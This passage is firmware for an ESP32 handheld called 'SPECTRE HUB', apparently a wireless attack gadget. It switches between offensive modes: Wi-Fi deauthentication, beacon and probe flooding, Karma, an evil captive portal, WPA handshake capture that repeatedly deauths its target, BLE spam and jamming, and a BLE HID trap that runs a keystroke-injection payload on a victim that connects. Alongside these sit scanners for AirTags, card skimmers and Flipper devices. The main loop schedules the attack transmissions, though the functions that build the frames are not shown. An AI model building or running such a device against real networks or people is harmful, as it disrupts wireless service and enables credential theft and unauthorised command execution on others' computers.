    snprintf(b, sizeof(b), "%3u %3u %s", s.prn, s.snr, g);
    setRow(4 + r, s.snr >= 30 ? COL_GREEN : (s.snr >= 15 ? COL_YELLOW : COL_GRAY), b);
  }
  forceAll = false;
}

static void composeCurrent() {
  switch (currentMode) {
    case IDLE:              composeIdle();       break;
    case PASSIVE:           composePassive();    break;
    case WIFI_SCAN:         composeWifiScan();   break;
    case WIFI_DEAUTH:
    case BEACON_SPAM:
    case PROBE_FLOOD:
    case KARMA:             composeTxAttack();   break;
    case HANDSHAKE_CAPTURE: composeHandshake();  break;
    case TARGET_SCAN:       composeTargetScan(); break;
    case EVIL_PORTAL:       composePortal();     break;
    case WARDRIVE:          composeWardrive();   break;
    case PACKET_MONITOR:    composePacketMonitor(); break;
    case BLE_SCAN:
    case AIRTAG_SCAN:
    case FLIPPER_SCAN:
    case SKIMMER_SCAN:      composeBleList();    break;
    case BLE_SNIFFER:       composeBleSniffer(); break;
    case BLE_SPAM:          composeBleSpam();    break;
    case BLE_JAMMER:        composeBleJam();     break;
    case BLE_HID_TRAP:      composeHid();        break;
    case SATELLITE_SCAN:    composeSatellite();  break;
    default:                composeStub();       break;
  }
}

static void statusString(char* out, int n) {
  char g[32]; gpsLine(g, sizeof(g));
  switch (currentMode) {
    case PASSIVE:           snprintf(out, n, "PASSIVE AP%d CL%d dx%lu", apCount, cliCount, (unsigned long)deauthTotal); break;
    case WIFI_SCAN:         snprintf(out, n, "WIFI SCAN APs:%d", apCount); break;
    case WIFI_DEAUTH:       snprintf(out, n, "DEAUTH tgt:%d tx:%lu", apCount, (unsigned long)txTotal); break;
    case BEACON_SPAM:       snprintf(out, n, "BEACON SPAM tx:%lu", (unsigned long)txTotal); break;
    case PROBE_FLOOD:       snprintf(out, n, "PROBE FLOOD tx:%lu", (unsigned long)txTotal); break;
    case KARMA:             snprintf(out, n, "KARMA tx:%lu", (unsigned long)txTotal); break;
    case HANDSHAKE_CAPTURE: snprintf(out, n, "HANDSHAKE EAPOL:%lu buf:%uB", (unsigned long)eapolCount, (unsigned)pcapLen); break;
    case TARGET_SCAN:       snprintf(out, n, "TARGET SCAN APs:%d", apCount); break;
    case EVIL_PORTAL:       snprintf(out, n, "PORTAL cli:%d hits:%d", portalClients(), portalHits); break;
    case WARDRIVE:          snprintf(out, n, "WARDRIVE APs:%d %s", apCount, g); break;
    case PACKET_MONITOR:    snprintf(out, n, "PKTMON fr:%lu dx:%lu", (unsigned long)framesTotal, (unsigned long)deauthTotal); break;
    case BLE_SCAN:          snprintf(out, n, "BLE SCAN found:%d", bleCount); break;
    case AIRTAG_SCAN:       snprintf(out, n, "AIRTAG found:%d", bleCount); break;
    case FLIPPER_SCAN:      snprintf(out, n, "FLIPPER found:%d", bleCount); break;
    case SKIMMER_SCAN:      snprintf(out, n, "SKIMMER found:%d", bleCount); break;
    case BLE_SNIFFER:       snprintf(out, n, "BLE SNIFF tracked:%d", bleCount); break;
    case BLE_SPAM:          snprintf(out, n, "BLE SPAM active"); break;
    case BLE_JAMMER:        snprintf(out, n, "BLE JAM tx:%lu", (unsigned long)jamTx); break;
    case SATELLITE_SCAN:    snprintf(out, n, "SAT %s inview:%d", g, g_satCount); break;
    default:                snprintf(out, n, "%s", MODE_NAME[currentMode]); break;
  }
}

// ---------------------------------------------------------------------------------------
// Mode transitions (enter/exit with clean radio handoff)
// ---------------------------------------------------------------------------------------
static RadioRole roleOf(Mode m) {
  if (m == BLE_HID_TRAP) return ROLE_HID;
  if (isWifiMode(m))     return ROLE_WIFI;   // includes TARGET_SCAN, WARDRIVE, PACKET_MONITOR
  return ROLE_CONTROL;                       // IDLE, BLE group, SATELLITE_SCAN (GPS only)
}

static void applyControlActivity(Mode m) {
  if (bleScanning) bleScanStop();
  if (bleSpamOn)   bleSpamStop();
  if (bleJamOn)    bleJamStop();
  switch (m) {
    case BLE_SCAN:     bleScanStart(BK_PLAIN);   break;
    case AIRTAG_SCAN:  bleScanStart(BK_AIRTAG);  break;
    case FLIPPER_SCAN: bleScanStart(BK_FLIPPER); break;
    case SKIMMER_SCAN: bleScanStart(BK_SKIMMER); break;
    case BLE_SNIFFER:  bleScanStart(BK_PLAIN);   break;
    case BLE_SPAM:     bleSpamStart();           break;
    case BLE_JAMMER:   bleJamStart();            break;
    default: break;
  }
}

static void requestMode(Mode next) {
  if (next == currentMode) return;
  RadioRole oldR = roleOf(currentMode), newR = roleOf(next);

  if (oldR != newR) {
    if      (oldR == ROLE_WIFI) { if (currentMode == EVIL_PORTAL) portalStop(); else wifiStop(); }
    else if (oldR == ROLE_HID)  duckyStop();
    else if (oldR == ROLE_CONTROL) { if (bleScanning) bleScanStop(); if (bleSpamOn) bleSpamStop(); if (bleJamOn) bleJamStop(); bleStop(); }
    delay(50);
    if      (newR == ROLE_WIFI) { if (next == EVIL_PORTAL) portalStart(); else wifiStart(); }
    else if (newR == ROLE_HID)  duckyStart(HID_BAIT_NAME);
    else if (newR == ROLE_CONTROL) bleStart();
  }

  // Reset per-mode counters so screens start clean
  if (next == PACKET_MONITOR || next == WARDRIVE) { for (int i = 0; i < 14; i++) chFrames[i] = 0; }
  if (next == HANDSHAKE_CAPTURE) { pcapLen = 0; pcapFrames = 0; eapolCount = 0; eapolHave = false; }

  currentMode = next;
  if (newR == ROLE_CONTROL) applyControlActivity(next);
  screenClear();
  setLeds(!isTxMode(currentMode), isTxMode(currentMode));
  composeCurrent();
  char s[64]; statusString(s, sizeof(s)); statusNotify(s);
  Serial.printf("[mode] -> %s (ble=%d wifi=%d)\n", MODE_NAME[currentMode], bleUp, promiscOn);
}

// ---------------------------------------------------------------------------------------
static void pollBootButton() {
  static bool last = true;
  static uint32_t lastChange = 0;
  bool now = digitalRead(BOOT_BTN);
  if (now != last && millis() - lastChange > 40) {
    lastChange = millis();
    if (now == LOW) { cycleIdx = (cycleIdx + 1) % CYCLE_N; requestMode(CYCLE[cycleIdx]); }
    last = now;
  }
}

void setup() {
  Serial.begin(115200);
  GPSser.begin(GPS_BAUD, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);
  randomSeed(esp_random());
  pinMode(BOOT_BTN, INPUT_PULLUP);
  memset(apTab, 0, sizeof(apTab));
  memset(cliTab, 0, sizeof(cliTab));

  tft.init();
  tft.setRotation(0);              // portrait 240x320 (vertical)
  screenClear();

  bleStart();                      // boot into IDLE with BLE up, WiFi off
  currentMode = IDLE;
  composeIdle();
  Serial.println("SPECTRE HUB up (IDLE, BLE advertising)");
}

void loop() {
  static uint32_t lastHop = 0, lastSend = 0, lastFull = 0, lastStatus = 0;
  uint32_t now = millis();

  gpsPoll();
  pollBootButton();

  if (pendingOpcode >= 0) {
    int op = pendingOpcode; pendingOpcode = -1;
    Mode m = opcodeToMode((uint8_t)op);
    if (m < MODE_COUNT) requestMode(m);
  }

  static uint32_t tgtScanT0 = 0;
  if (currentMode == TARGET_SCAN) {
    if (tgtScanT0 == 0) tgtScanT0 = now;
    if (now - tgtScanT0 > 8000) { tgtScanT0 = 0; requestMode(IDLE); }
  } else tgtScanT0 = 0;

  if (g_pendingAplist && bleUp && phoneConnected) { g_pendingAplist = false; sendAplist(); }
  if (g_pendingPcap   && bleUp && phoneConnected) { g_pendingPcap   = false; sendPcap();   }

  if (currentMode == BLE_HID_TRAP && duckyVictimReady()) {
    g_duckyState = 2; composeCurrent();
    duckyRunSelected();
    g_duckyRan = true; g_duckyState = 3; composeCurrent();
  }

  bool lockCh = (currentMode == HANDSHAKE_CAPTURE && g_haveTarget && g_tgtCh);
  if (promiscOn && now - lastHop >= HOP_MS) {
    lastHop = now;
    if (lockCh) { esp_wifi_set_channel(g_tgtCh, WIFI_SECOND_CHAN_NONE); curCh = g_tgtCh; }
    else        hop();
  }

  static uint32_t lastTx = 0;
  if (promiscOn) {
    if      (currentMode == WIFI_DEAUTH && now - lastTx >= 100) { lastTx = now; txDeauthTarget(); }
    else if (currentMode == BEACON_SPAM && now - lastTx >= 25)  { lastTx = now; txBeacon(); }
    else if (currentMode == PROBE_FLOOD && now - lastTx >= 15)  { lastTx = now; txProbe(); }
    else if (currentMode == KARMA       && now - lastTx >= 120) { lastTx = now; txKarma(); }
    else if (currentMode == HANDSHAKE_CAPTURE && g_haveTarget && now - lastTx >= 3000) {
      lastTx = now; txDeauthTarget();
    }
  }
  bleSpamTick();
  bleJamTick();

  if (now - lastSend >= SEND_MS) {
    lastSend = now;
    g_cycles++;
    if (promiscOn) ageOut();
    if (now - lastFull >= FULLREFRESH_MS) { forceAll = true; lastFull = now; }
    composeCurrent();
  }

  if (bleUp && phoneConnected && now - lastStatus >= STATUS_MS) {
    lastStatus = now;
    char s[64]; statusString(s, sizeof(s)); statusNotify(s);
  }
  delay(3);
}
